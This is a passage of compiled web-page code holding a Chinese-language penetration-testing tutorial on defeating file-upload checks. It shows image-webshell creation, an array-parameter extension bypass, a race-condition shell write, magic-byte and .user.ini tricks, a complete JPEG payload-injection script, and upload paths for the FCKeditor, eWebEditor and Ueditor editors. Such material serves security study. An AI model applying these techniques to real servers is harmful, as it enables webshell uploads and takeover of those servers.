",(0,i.jsx)(n.code,{children:"shell.php"}),"\uff0c\u8fd9\u662f\u4e00\u4e2a",(0,i.jsx)(n.code,{children:"PHP"}),"\u811a\u672c\u6587\u4ef6\uff0c\u800c\u4e0d\u662f\u56fe\u7247"]}),"\n",(0,i.jsx)(n.p,{children:"2.\u56fe\u7247\u9a6c"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"edjpgcom.exe"}),"\u751f\u6210\u6216\u8005\u4f7f\u7528",(0,i.jsx)(n.code,{children:"copy"}),"\u547d\u4ee4\u751f\u6210"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"copy 1.jpg/b+2.php 3.jpg\n"})}),"\n",(0,i.jsx)(n.p,{children:"3.\u6570\u7ec4\u7ed5\u8fc7"}),"\n",(0,i.jsxs)(n.p,{children:["\u5728PHP\u4e2d\uff0c\u5982\u679c\u7a0b\u5e8f\u4e0d\u4e25\u683c\u9a8c\u8bc1\u7528\u6237\u8f93\u5165\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u63d0\u4f9b\u975e\u9884\u671f\u7684\u6570\u7ec4\u7ed3\u6784\u6765\u7ed5\u8fc7\u5b89\u5168\u9650\u5236\u3002\u5728\u8be5PHP\u4ee3\u7801\u793a\u4f8b\u4e2d\uff0c\u5b58\u5728\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\uff0c\u56e0\u4e3a\u5b83\u76f4\u63a5\u4f7f\u7528\u4e86\u7528\u6237\u901a\u8fc7GET\u8bf7\u6c42\u63d0\u4f9b\u7684",(0,i.jsx)(n.code,{children:"save_name"}),"\u53c2\u6570\uff0c\u800c\u6ca1\u6709\u8fdb\u884c\u9002\u5f53\u7684\u9a8c\u8bc1"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php\r\n$file =$_GET['save_name'];\r\necho $file_name = reset($file) . '.' . $file[count($file) - 1];\r\n?>\n"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"reset($file)"}),"\u51fd\u6570\u8fd4\u56de\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c",(0,i.jsx)(n.code,{children:"$file[count($file) - 1]"}),"\u5c1d\u8bd5\u83b7\u53d6\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20"]}),"\n",(0,i.jsxs)(n.p,{children:["\u5982\u679c\u653b\u51fb\u8005\u63a7\u5236\u4e86",(0,i.jsx)(n.code,{children:"$file"}),"\u6570\u7ec4\uff0c\u4ed6\u4eec\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u65b9\u5f0f\u7ed5\u8fc7\u6587\u4ef6\u7c7b\u578b\u68c0\u67e5\uff1a"]}),"\n",(0,i.jsxs)(n.p,{children:["\u653b\u51fb\u8005\u53ef\u4ee5\u53d1\u9001\u4e00\u4e2a\u6570\u7ec4\uff0c\u5176\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u671f\u671b\u7684\u6587\u4ef6\u540d\uff0c\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u662f",(0,i.jsx)(n.code,{children:".php"}),"\uff08\u6216\u5176\u4ed6\u53ef\u6267\u884c\u6587\u4ef6\u6269\u5c55\u540d\uff09\uff0c\u7531\u4e8eWindows\u7cfb\u7edf\u4f1a\u81ea\u52a8\u5220\u9664\u6587\u4ef6\u540d\u672b\u5c3e\u7684",(0,i.jsx)(n.code,{children:"."}),"\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u6765\u7ed5\u8fc7\u6587\u4ef6\u6269\u5c55\u540d\u7684\u9650\u5236"]}),"\n",(0,i.jsx)(n.p,{children:"\u5047\u8bbe\u653b\u51fb\u8005\u53d1\u9001\u4ee5\u4e0bGET\u8bf7\u6c42\uff1a"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"http://example.com/upload.php?save_name[0]=shell&save_name[2]=php\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u6700\u7ec8\u6587\u4ef6\u4e3a",(0,i.jsx)(n.code,{children:"shell.php"})]}),"\n",(0,i.jsx)(n.h5,{id:"\u6761\u4ef6\u7ade\u4e89",children:"\u6761\u4ef6\u7ade\u4e89"}),"\n",(0,i.jsx)(n.p,{children:"\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\uff0c\u53d1\u751f\u5728\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u8bbf\u95ee\u540c\u4e00\u4e2a\u5171\u4eab\u4ee3\u7801\u3001\u53d8\u91cf\u3001\u6587\u4ef6\u7b49\u6ca1\u6709\u8fdb\u884c\u9501\u64cd\u4f5c\u6216\u8005\u540c\u6b65\u64cd\u4f5c\u7684\u573a\u666f\u4e2d\u3002\u670d\u52a1\u5668\u5bf9\u4e0a\u4f20\u6587\u4ef6\u7684\u64cd\u4f5c\u5927\u591a\u6570\u90fd\u662f\u5355\u7ebf\u7a0b\u5904\u7406\uff0c\u5f53\u6211\u4eec\u6267\u884c\u591a\u4e2a\u7ebf\u7a0b\u65f6\u53ef\u4ee5\u7ed5\u8fc7\u4e00\u4e9b\u670d\u52a1\u5668\u7aef\u7684\u9632\u5fa1\u3002 \u8fd9\u91cc\u4f7f\u7528\u4e86unlink\u51fd\u6570\u6765\u5220\u9664\u4e0d\u7b26\u5408\u7684\u6587\u4ef6\uff0c\u4f46\u4ee3\u7801\u6267\u884c\u7684\u8fc7\u7a0b\u662f\u9700\u8981\u8017\u8d39\u65f6\u95f4\u7684\u3002\u5982\u679c\u6211\u4eec\u80fd\u5728\u4e0a\u4f20\u7684\u4e00\u53e5\u8bdd\u88ab\u5220\u9664\u4e4b\u524d\u8bbf\u95ee\u5c31\u80fd\u591f\u6210\u529f\u6267\u884c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php fputs(fopen('shell.php','w'),'<?php phpinfo();?>'); ?>\n"})}),"\n",(0,i.jsx)(n.h5,{id:"\u6587\u4ef6\u5934\u7ed5\u8fc7\u68c0\u6d4b\u6587\u4ef6\u5934",children:"\u6587\u4ef6\u5934\u7ed5\u8fc7\uff08\u68c0\u6d4b\u6587\u4ef6\u5934\uff09"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"JPEG (JPG) \u6587\u4ef6\r\n\u6587\u4ef6\u5934: FF D8 FF\r\nPNG \u6587\u4ef6\r\n\u6587\u4ef6\u5934: 89 50 4E 47 0D 0A 1A 0A\r\nGIF \u6587\u4ef6\r\n\u6587\u4ef6\u5934: 47 49 46 38 (GIF89a) \u6216\u8005 47 49 46 38 37 61 (GIF87a)\r\nPDF \u6587\u4ef6\r\n\u6587\u4ef6\u5934: %PDF-\r\nZIP \u6587\u4ef6\r\n\u6587\u4ef6\u5934: 50 4B 03 04 (\u538b\u7f29\u7684ZIP\u6587\u4ef6) \u6216\u8005 50 4B 05 06 (\u672a\u538b\u7f29\u7684ZIP\u6587\u4ef6)\r\nMicrosoft Office \u6587\u4ef6\r\nWord\u6587\u6863 (.doc): D0 CF 11 E0 A1 B1 1A E1\r\nWord\u6587\u6863 (.docx): 50 4B 03 04 14 00 06 00\r\nExcel\u7535\u5b50\u8868\u683c (.xls): D0 CF 11 E0 A1 B1 1A E1\r\nExcel\u7535\u5b50\u8868\u683c (.xlsx): 50 4B 03 04 14 00 06 00\r\nPowerPoint\u6f14\u793a\u6587\u7a3f (.ppt): D0 CF 11 E0 A1 B1 1A E1\r\nPowerPoint\u6f14\u793a\u6587\u7a3f (.pptx): 50 4B 03 04 14 00 06 00\r\nTIFF \u6587\u4ef6\r\n\u6587\u4ef6\u5934: 49 49 2A 00 (\u5c0f\u7aef) \u6216\u8005 4D 4D 00 2A (\u5927\u7aef)\r\nMP3 \u6587\u4ef6\r\n\u6587\u4ef6\u5934: 49 44 33 \u540e\u9762\u901a\u5e38\u8ddf\u7740 2E 00 \u6216\u8005\u5176\u4ed6\u6807\u8bc6\u7248\u672c\u548c\u5c42\u7684\u4fe1\u606f\r\nAVI \u6587\u4ef6\r\n\u6587\u4ef6\u5934: 52 49 46 46 (RIFF) \u7d27\u63a5\u7740\u662f 41 56 49 20 (AVI )\r\nBMP \u6587\u4ef6\r\n\u6587\u4ef6\u5934: 42 4D\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5728\u8fdb\u884c\u6587\u4ef6\u5934\u7ed5\u8fc7\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u4e0a\u9762\u7684\u6587\u4ef6\u5934\u6dfb\u52a0\u5230\u6211\u4eec\u7684\u4e00\u53e5\u8bdd\u6728\u9a6c\u5185\u5bb9\u6700\u524d\u9762\uff0c\u8fbe\u5230\u7ed5\u8fc7\u6587\u4ef6\u5934\u68c0\u6d4b\u7684\u76ee\u7684\u3002"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"GIF89a\r\n\r\n<?php phpinfo();?>\n"})}),"\n",(0,i.jsx)(n.h5,{id:"userini\u6587\u4ef6",children:".user.ini\u6587\u4ef6"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:".user.ini"}),"\u4e2d\u4e24\u4e2a\u4e2d\u7684\u914d\u7f6e",(0,i.jsx)(n.code,{children:"auto_prepend_file"}),"\u548c",(0,i.jsx)(n.code,{children:"auto_append_file"}),"\u3002\u8fd9\u4e24\u4e2a\u914d\u7f6e\u7684\u610f\u601d\u5c31\u662f\uff1a\u6211\u4eec\u6307\u5b9a\u4e00\u4e2a\u6587\u4ef6\uff08\u5982",(0,i.jsx)(n.code,{children:"1.jpg"}),"\uff09\uff0c\u90a3\u4e48\u8be5\u6587\u4ef6\u5c31\u4f1a\u88ab\u5305\u542b\u5728\u8981\u6267\u884c\u7684",(0,i.jsx)(n.code,{children:"php"}),"\u6587\u4ef6\u4e2d\uff08\u5982",(0,i.jsx)(n.code,{children:"index.php"}),"\uff09\uff0c\u76f8\u5f53\u4e8e\u5728",(0,i.jsx)(n.code,{children:"index.php"}),"\u4e2d\u63d2\u5165\u4e00\u53e5\uff1a",(0,i.jsx)(n.code,{children:"require(./1.jpg)"}),"\u3002\u8fd9\u4e24\u4e2a\u8bbe\u7f6e\u7684\u533a\u522b\u53ea\u662f\u5728\u4e8e",(0,i.jsx)(n.code,{children:"auto_prepend_file"}),"\u662f\u5728\u6587\u4ef6\u524d\u63d2\u5165\uff0c",(0,i.jsx)(n.code,{children:"auto_append_file"}),"\u5728\u6587\u4ef6\u6700\u540e\u63d2\u5165\u3002"]}),"\n",(0,i.jsxs)(n.p,{children:["\u5229\u7528",(0,i.jsx)(n.code,{children:".user.ini"}),"\u7684\u524d\u63d0\u662f\u670d\u52a1\u5668\u5f00\u542f\u4e86",(0,i.jsx)(n.code,{children:"CGI"}),"\u6216\u8005",(0,i.jsx)(n.code,{children:"FastCGI"}),"\uff0c\u5e76\u4e14\u4e0a\u4f20\u6587\u4ef6\u7684\u5b58\u50a8\u8def\u5f84\u4e0b\u6709",(0,i.jsx)(n.code,{children:"index.php"}),"\u53ef\u6267\u884c\u6587\u4ef6\uff0c",(0,i.jsx)(n.code,{children:"php"}),"\u7248\u672c\u5fc5\u987b\u8981\u57285\u4ee5\u4e0a"]}),"\n",(0,i.jsxs)(n.p,{children:["\u8be5",(0,i.jsx)(n.code,{children:".user.ini"}),"\u6587\u4ef6\u610f\u601d\u662f\u65e0\u8bba\u8bbf\u95ee\u5f53\u524d\u76ee\u5f55\u4e0b\u54ea\u4e2a ",(0,i.jsx)(n.code,{children:"php"})," \u6587\u4ef6\u90fd\u4f1a\u81ea\u52a8\u53bb\u5305\u542b ",(0,i.jsx)(n.code,{children:"1.jpg"})," \u8fd9\u4e2a\u6587\u4ef6\uff0c\u5f97\u6211\u4eec\u4e0a\u4f20\u7684\u56fe\u7247\u683c\u5f0f\u7684",(0,i.jsx)(n.code,{children:"webshell"}),"\u4e5f\u80fd\u591f\u88ab\u89e3\u6790\uff0c\u4ee5\u6b64\u6210\u529f\u5229\u7528\u6f0f\u6d1e\u62ff\u5230",(0,i.jsx)(n.code,{children:"shell"}),"\u6743\u9650"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-ini",children:"auto_prepend_file=1.jpg\r\nauto_append_file=1.jpg\n"})}),"\n",(0,i.jsx)(n.h5,{id:"\u4e8c\u6b21\u6e32\u67d3",children:"\u4e8c\u6b21\u6e32\u67d3"}),"\n",(0,i.jsx)(n.p,{children:"\u4e00\u4e9b\u6587\u4ef6\u4e0a\u4f20\u70b9\uff0c\u56fe\u7247\u5728\u4e0a\u4f20\u4e4b\u540e\uff0c\u4f1a\u5bf9\u5176\u8fdb\u884c\u4e8c\u6b21\u5904\u7406\uff08\u683c\u5f0f\u3001\u5c3a\u5bf8\u8981\u6c42\u7b49\uff09\uff0c\u670d\u52a1\u5668\u4f1a\u628a\u91cc\u9762\u7684\u5185\u5bb9\u8fdb\u884c\u66ff\u6362\u66f4\u65b0\uff0c\u7136\u540e\u518d\u4fdd\u5b58\uff0c\u4ece\u800c\u5bfc\u81f4\u6211\u4eec\u5728\u4f20\u56fe\u7247\u9a6c\u65f6\u91cc\u9762\u7684\u5185\u5bb9\u88ab\u7834\u574f\uff0c\u5bfc\u81f4\u6728\u9a6c\u7a0b\u5e8f\u65e0\u6cd5\u6b63\u5e38\u6267\u884c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"\u53c2\u8003\u6587\u7ae0\uff1ahttps://xz.aliyun.com/news/2337#toc-3\n"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"gif"}),"\uff1a\u5148\u5c06\u666e\u901a\u7684",(0,i.jsx)(n.code,{children:"gif"}),"\u56fe\u7247\u4e0a\u4f20\uff0c\u4f1a\u88ab\u6e32\u67d3\uff0c\u6e32\u67d3\u4e4b\u540e\u518d\u4e0b\u8f7d\u4e0b\u6765\uff0c\u4e0e\u539f",(0,i.jsx)(n.code,{children:"git"}),"\u56fe\u7247\u5bf9\u6bd4\uff0c\u627e\u5230\u6e32\u67d3\u524d\u540e\u6ca1\u6709\u53d8\u5316\u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u5728\u8fd9\u4e9b\u4f4d\u7f6e\u63d2\u5165",(0,i.jsx)(n.code,{children:"php"}),"\u4e00\u53e5\u8bdd\uff0c\u518d\u4e0a\u4f20\u5373\u53ef\u3002"]}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"png"}),"\uff1a\u7d22\u5f15\u7c7b\u578b\u56fe\uff0c\u7531\u591a\u4e2a\u6570\u636e\u5757\u7ec4\u6210\uff0c\u76f8\u5bf9\u590d\u6742\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5c06\u6728\u9a6c\u5199\u5165 ",(0,i.jsx)(n.code,{children:"PLTE"})," \u6570\u636e\u5757\u6216\u5199\u5165",(0,i.jsx)(n.code,{children:"IDAT"}),"\u6570\u636e\u5757"]}),"\n",(0,i.jsxs)(n.p,{children:["\u5199\u5165 ",(0,i.jsx)(n.code,{children:"PLTE"})," \u6570\u636e\u5757\uff1a"]}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"php"}),"\u5e95\u5c42\u5728\u5bf9",(0,i.jsx)(n.code,{children:"PLTE"}),"\u6570\u636e\u5757\u9a8c\u8bc1\u7684\u65f6\u5019,\u4e3b\u8981\u8fdb\u884c\u4e86",(0,i.jsx)(n.code,{children:"CRC"}),"\u6821\u9a8c.\u6240\u4ee5\u53ef\u4ee5\u5728",(0,i.jsx)(n.code,{children:"chunk data"}),"\u57df\u63d2\u5165",(0,i.jsx)(n.code,{children:"php"}),"\u4ee3\u7801,\u7136\u540e\u91cd\u65b0\u8ba1\u7b97\u76f8\u5e94\u7684",(0,i.jsx)(n.code,{children:"crc"}),"\u503c\u5e76\u4fee\u6539\u5373\u53ef\uff1b\u8fd9\u79cd\u65b9\u5f0f\u53ea\u9488\u5bf9\u7d22\u5f15\u5f69\u8272\u56fe\u50cf\u7684",(0,i.jsx)(n.code,{children:"png"}),"\u56fe\u7247\u624d\u6709\u6548,\u5728\u9009\u53d6",(0,i.jsx)(n.code,{children:"png"}),"\u56fe\u7247\u65f6\u53ef\u6839\u636e",(0,i.jsx)(n.code,{children:"IHDR"}),"\u6570\u636e\u5757\u7684",(0,i.jsx)(n.code,{children:"color type"}),"\u8fa8\u522b.",(0,i.jsx)(n.code,{children:"03"}),"\u4e3a\u7d22\u5f15\u5f69\u8272\u56fe\u50cf."]}),"\n",(0,i.jsxs)(n.p,{children:["\u5199\u5165",(0,i.jsx)(n.code,{children:"IDAT"}),"\u6570\u636e\u5757\uff1a"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php\r\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\r\n           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\r\n           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\r\n           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\r\n           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\r\n           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\r\n           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\r\n           0x66, 0x44, 0x50, 0x33);\r\n\r\n\r\n\r\n$img = imagecreatetruecolor(32, 32);\r\n\r\nfor ($y = 0; $y < sizeof($p); $y += 3) {\r\n   $r = $p[$y];\r\n   $g = $p[$y+1];\r\n   $b = $p[$y+2];\r\n   $color = imagecolorallocate($img, $r, $g, $b);\r\n   imagesetpixel($img, round($y / 3), 0, $color);\r\n}\r\n\r\nimagepng($img,'./1.png');\r\n?>\n"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"jpg"}),"\uff1a\u5f88\u96be\u6210\u529f\u5b9e\u73b0\uff0c\u53ef\u5c1d\u8bd5\u4f7f\u7528\u811a\u672c\u751f\u6210\u56fe\u7247\u4e0a\u4f20\u5c1d\u8bd5"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php\r\n    /*\r\n\r\n    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().\r\n    It is necessary that the size and quality of the initial image are the same as those of the processed image.\r\n\r\n    1) Upload an arbitrary image via secured files upload script\r\n    2) Save the processed image and launch:\r\n    jpg_payload.php <jpg_name.jpg>\r\n\r\n    In case of successful injection you will get a specially crafted image, which should be uploaded again.\r\n\r\n    Since the most straightforward injection method is used, the following problems can occur:\r\n    1) After the second processing the injected data may become partially corrupted.\r\n    2) The jpg_payload.php script outputs \"Something's wrong\".\r\n    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.\r\n\r\n    Sergey Bobrov @Black2Fan.\r\n\r\n    See also:\r\n    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/\r\n\r\n    */\r\n\r\n    $miniPayload = \"<?=phpinfo();?>\";\r\n\r\n\r\n    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {\r\n        die('php-gd is not installed');\r\n    }\r\n\r\n    if(!isset($argv[1])) {\r\n        die('php jpg_payload.php <jpg_name.jpg>');\r\n    }\r\n\r\n    set_error_handler(\"custom_error_handler\");\r\n\r\n    for($pad = 0; $pad < 1024; $pad++) {\r\n        $nullbytePayloadSize = $pad;\r\n        $dis = new DataInputStream($argv[1]);\r\n        $outStream = file_get_contents($argv[1]);\r\n        $extraBytes = 0;\r\n        $correctImage = TRUE;\r\n\r\n        if($dis->readShort() != 0xFFD8) {\r\n            die('Incorrect SOI marker');\r\n        }\r\n\r\n        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {\r\n            $marker = $dis->readByte();\r\n            $size = $dis->readShort() - 2;\r\n            $dis->skip($size);\r\n            if($marker === 0xDA) {\r\n                $startPos = $dis->seek();\r\n                $outStreamTmp = \r\n                    substr($outStream, 0, $startPos) . \r\n                    $miniPayload . \r\n                    str_repeat(\"\\0\",$nullbytePayloadSize) . \r\n                    substr($outStream, $startPos);\r\n                checkImage('_'.$argv[1], $outStreamTmp, TRUE);\r\n                if($extraBytes !== 0) {\r\n                    while((!$dis->eof())) {\r\n                        if($dis->readByte() === 0xFF) {\r\n                            if($dis->readByte !== 0x00) {\r\n                                break;\r\n                            }\r\n                        }\r\n                    }\r\n                    $stopPos = $dis->seek() - 2;\r\n                    $imageStreamSize = $stopPos - $startPos;\r\n                    $outStream = \r\n                        substr($outStream, 0, $startPos) . \r\n                        $miniPayload . \r\n                        substr(\r\n                            str_repeat(\"\\0\",$nullbytePayloadSize).\r\n                                substr($outStream, $startPos, $imageStreamSize),\r\n                            0,\r\n                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . \r\n                                substr($outStream, $stopPos);\r\n                } elseif($correctImage) {\r\n                    $outStream = $outStreamTmp;\r\n                } else {\r\n                    break;\r\n                }\r\n                if(checkImage('payload_'.$argv[1], $outStream)) {\r\n                    die('Success!');\r\n                } else {\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n    }\r\n    unlink('payload_'.$argv[1]);\r\n    die('Something\\'s wrong');\r\n\r\n    function checkImage($filename, $data, $unlink = FALSE) {\r\n        global $correctImage;\r\n        file_put_contents($filename, $data);\r\n        $correctImage = TRUE;\r\n        imagecreatefromjpeg($filename);\r\n        if($unlink)\r\n            unlink($filename);\r\n        return $correctImage;\r\n    }\r\n\r\n    function custom_error_handler($errno, $errstr, $errfile, $errline) {\r\n        global $extraBytes, $correctImage;\r\n        $correctImage = FALSE;\r\n        if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) {\r\n            if(isset($m[1])) {\r\n                $extraBytes = (int)$m[1];\r\n            }\r\n        }\r\n    }\r\n\r\n    class DataInputStream {\r\n        private $binData;\r\n        private $order;\r\n        private $size;\r\n\r\n        public function __construct($filename, $order = false, $fromString = false) {\r\n            $this->binData = '';\r\n            $this->order = $order;\r\n            if(!$fromString) {\r\n                if(!file_exists($filename) || !is_file($filename))\r\n                    die('File not exists ['.$filename.']');\r\n                $this->binData = file_get_contents($filename);\r\n            } else {\r\n                $this->binData = $filename;\r\n            }\r\n            $this->size = strlen($this->binData);\r\n        }\r\n\r\n        public function seek() {\r\n            return ($this->size - strlen($this->binData));\r\n        }\r\n\r\n        public function skip($skip) {\r\n            $this->binData = substr($this->binData, $skip);\r\n        }\r\n\r\n        public function readByte() {\r\n            if($this->eof()) {\r\n                die('End Of File');\r\n            }\r\n            $byte = substr($this->binData, 0, 1);\r\n            $this->binData = substr($this->binData, 1);\r\n            return ord($byte);\r\n        }\r\n\r\n        public function readShort() {\r\n            if(strlen($this->binData) < 2) {\r\n                die('End Of File');\r\n            }\r\n            $short = substr($this->binData, 0, 2);\r\n            $this->binData = substr($this->binData, 2);\r\n            if($this->order) {\r\n                $short = (ord($short[1]) << 8) + ord($short[0]);\r\n            } else {\r\n                $short = (ord($short[0]) << 8) + ord($short[1]);\r\n            }\r\n            return $short;\r\n        }\r\n\r\n        public function eof() {\r\n            return !$this->binData||(strlen($this->binData) === 0);\r\n        }\r\n    }\r\n?>\r\n\u4f7f\u7528\u65b9\u6cd5\uff1a\r\n\u627e\u4e00\u4e2ajpg\u56fe\u7247,\u5148\u4e0a\u4f20\u81f3\u670d\u52a1\u5668\u7136\u540e\u518d\u4e0b\u8f7d\u5230\u672c\u5730\u4fdd\u5b58\u4e3a1.jpg.\r\n\u63d2\u5165php\u4ee3\u7801\r\n\u4f7f\u7528\u811a\u672c\u5904\u74061.jpg,\u547d\u4ee4php jpg_payload.php 1.jpg\r\n\u4f7f\u752816\u8fdb\u5236\u7f16\u8f91\u5668\u6253\u5f00,\u5c31\u53ef\u4ee5\u770b\u5230\u63d2\u5165\u7684php\u4ee3\u7801.\n"})}),"\n",(0,i.jsx)(n.h5,{id:"\u7f16\u8f91\u5668\u6f0f\u6d1e",children:"\u7f16\u8f91\u5668\u6f0f\u6d1e"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"\u5e38\u7528\u7f16\u8f91\u5668\uff1a\r\nFCKeditor\r\nEWEbeditor\r\nCKFinder\r\nUEDITOR\r\nDotNet TextBox\r\nCute Editor\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"https://wizardforcel.gitbooks.io/owasp-cheat-sheet-zh/content/editor-vulnerability-manual.html#fckeditor",children:"\u7f16\u8f91\u5668\u6f0f\u6d1e\u624b\u518c | \u5b89\u5168\u5907\u5fd8\u5355\u7ffb\u8bd1\u9879\u76ee"})}),"\n",(0,i.jsxs)(n.p,{children:["1.",(0,i.jsx)(n.code,{children:"Fckeditor"}),"\u7f16\u8f91\u5668"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"\u5e38\u89c1\u4e0a\u4f20\u76ee\u5f55\uff1a\r\nFCKeditor/editor/filemanager/browser/default/connectors/test.html\r\nFCKeditor/editor/filemanager/upload/test.html\r\nFCKeditor/editor/filemanager/connectors/test.html\r\nFCKeditor/editor/filemanager/connectors/uploadtest.html\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u201c.\u201d \u53d8 \u201c_\u201d \u7ed5\u8fc7\u65b9\u6cd5\r\n\u5728\u9ad8\u7248\u672c",(0,i.jsx)(n.code,{children:"fck"}),"\u4e2d\uff0c\u76f4\u63a5\u4e0a\u4f20\u6216\u6293\u5305\u4fee\u6539\u6587\u4ef6\u540d",(0,i.jsx)(n.code,{children:"\u201cshell.asp;.jpg\u201d"}),"\uff0c\u90fd\u4f1a\u5c06\u524d\u9762\u7684\u70b9\u53d8\u6210\u4e0b\u5212\u7ebf\uff0c\u4e5f\u5c31\u662f\u53d8\u6210",(0,i.jsx)(n.code,{children:"\u201ca_asp;.jpg\u201d"}),"\u3002\u9700\u8981\u521b\u5efa",(0,i.jsx)(n.code,{children:"1.asp"}),"\u6587\u4ef6\u5939\uff0c\u7136\u540e\u5728",(0,i.jsx)(n.code,{children:"1.asp"}),"\u6587\u4ef6\u5939\u4e0b\u4e0a\u4f20\u56fe\u7247\u9a6c\u5373\u53ef\u89e3\u6790\u4e3a",(0,i.jsx)(n.code,{children:"asp"}),"\u6587\u4ef6\u3002\u7c7b\u4f3c\u4e8e\u524d\u6587\u7684",(0,i.jsx)(n.code,{children:"iis"}),"\u89e3\u6790\u6f0f\u6d1e\u3002"]}),"\n",(0,i.jsxs)(n.p,{children:["2.",(0,i.jsx)(n.code,{children:"eWebEditor"}),"\u7f16\u8f91\u5668"]}),"\n",(0,i.jsx)(n.p,{children:"1\uff09\u540e\u53f0\uff08\u5f31\u53e3\u4ee4\u6216\u8005\u672a\u6388\u6743\uff09"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"eWeb"}),"\u7f16\u8f91\u5668\u9700\u8981\u767b\u5f55\u540e\u53f0\uff0c\u5176\u9ed8\u8ba4\u6570\u636e\u5e93\u5730\u5740\u662f\uff1a",(0,i.jsx)(n.code,{children:"ewebeditor/db/ewebeditor.mdb"}),"\r\n2\uff09",(0,i.jsx)(n.code,{children:"eweb"}),"\u904d\u5386\u6f0f\u6d1e"]}),"\n",(0,i.jsx)(n.p,{children:"\u5229\u7528\u8be5\u6f0f\u6d1e\u904d\u5386\u6587\u4ef6\u76ee\u5f55\u3001\u67e5\u770b\u6574\u4e2a\u7f51\u7ad9\u7ed3\u6784\u53ca\u654f\u611f\u4fe1\u606f"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.code,{children:"ewebeditor/admin_uploadfile.asp?id=14&dir=./"})}),"\n",(0,i.jsxs)(n.p,{children:["3\uff09\u4fee\u6539\u6837\u5f0f\r\n\u5728\u56fe\u7247\u7c7b\u578b\u4e2d\u6dfb\u52a0",(0,i.jsx)(n.code,{children:".asa"}),"\u540e\u7f00\uff0c\u7f16\u8f91\u5668\u4f1a\u89e3\u6790\u4e3a",(0,i.jsx)(n.code,{children:"asp"}),"\u6587\u4ef6\r\n\u6253\u5f00\u201c\u5de5\u5177\u680f\u201d\u70b9\u51fb\u6309\u94ae\u8bbe\u7f6e\uff0c\u6dfb\u52a0\u63d2\u5165\u56fe\u7247\u7684\u6309\u94ae\uff0c\u4fdd\u5b58\uff0c\u4e0a\u4f20",(0,i.jsx)(n.code,{children:"asa"}),"\u6587\u4ef6\u5373\u53ef\u3002"]}),"\n",(0,i.jsxs)(n.p,{children:["3.",(0,i.jsx)(n.code,{children:"Ueditor"}),"\u7f16\u8f91\u5668"]}),"\n",(0,i.jsxs)(n.p,{children:["\u8bbf\u95ee",(0,i.jsx)(n.code,{children:"http://ip:port/net/controller.ashx"})," \u63a7\u5236\u5668\u6587\u4ef6\u3002"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-json",children:'\u8fd4\u56de\u8be5\u5185\u5bb9\u8868\u793a\u6f0f\u6d1e\u5b58\u5728\uff1a{"state":"action \u53c2\u6570\u4e3a\u7a7a\u6216\u8005 action 